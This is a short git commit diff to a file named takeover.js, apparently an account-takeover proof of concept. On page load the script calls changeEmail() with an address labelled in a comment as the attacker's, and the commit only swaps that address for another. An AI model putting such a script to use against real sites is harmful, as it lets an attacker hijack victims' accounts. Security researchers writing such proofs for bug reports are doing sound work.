d5e5894cd7ea6b1600f49f7d4d56fd0651093b61
s4ur4bh-1337 <142944572+s4ur4bh-1337@users.noreply.github.com>
2023-08-24 17:08:00 +0530

    Update takeover.js

--- takeover.js
+++ takeover.js
@@ -35,6 +35,6 @@ $(document).ready(function() {
     }
     
     // triggering change email with the attacker's email address
-    changeEmail("s4ur4bh.1337@gmail.com");
+    changeEmail("s4ur4bh.1337.attacker@gmail.com");
     
 });
